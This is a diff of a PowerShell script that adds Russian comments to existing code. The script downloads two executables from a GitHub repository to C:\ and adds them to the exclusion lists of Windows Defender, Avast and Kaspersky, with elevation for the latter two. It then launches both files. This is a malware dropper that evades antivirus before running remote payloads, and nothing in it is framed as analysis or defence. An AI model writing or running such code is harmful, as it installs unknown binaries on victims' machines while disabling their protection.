@@ -1,3 +1,4 @@
+# Функция для добавления файла в исключения Windows Defender
 function Add-To-WindowsDefender-Exclusion {
     param (
         [string]$filePath
@@ -5,6 +6,7 @@ function Add-To-WindowsDefender-Exclusion {
     Add-MpPreference -ExclusionPath $filePath
 }
 
+# Функция для добавления файла в исключения Avast Antivirus
 function Add-To-Avast-Exclusion {
     param (
         [string]$filePath
@@ -12,6 +14,7 @@ function Add-To-Avast-Exclusion {
     Start-Process -FilePath "C:\Program Files\AVAST Software\Avast\avast.exe" -ArgumentList "/exclude add $filePath" -Verb RunAs -Wait
 }
 
+# Функция для добавления файла в исключения Kaspersky Antivirus
 function Add-To-Kaspersky-Exclusion {
     param (
         [string]$filePath
@@ -19,20 +22,26 @@ function Add-To-Kaspersky-Exclusion {
     Start-Process -FilePath "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Anti-Virus 20.xx\avp.com" -ArgumentList "/add-exclusion=$filePath" -Verb RunAs -Wait
 }
 
+# Пути к файлам
 $file1 = "C:\1.exe"
 $file2 = "C:\2.exe"
 
+# Загрузка файлов
 Invoke-WebRequest -Uri "https://github.com/cs2cc/s/raw/main/1.exe" -OutFile $file1
 Invoke-WebRequest -Uri "https://github.com/cs2cc/s/raw/main/2.exe" -OutFile $file2
 
+# Добавление в исключения Windows Defender
 Add-To-WindowsDefender-Exclusion -filePath $file1
 Add-To-WindowsDefender-Exclusion -filePath $file2
 
+# Добавление в исключения Avast Antivirus
 Add-To-Avast-Exclusion -filePath $file1
 Add-To-Avast-Exclusion -filePath $file2
 
+# Добавление в исключения Kaspersky Antivirus
 Add-To-Kaspersky-Exclusion -filePath $file1
 Add-To-Kaspersky-Exclusion -filePath $file2
 
+# Запуск файлов
 Start-Process -FilePath $file1
 Start-Process -FilePath $file2
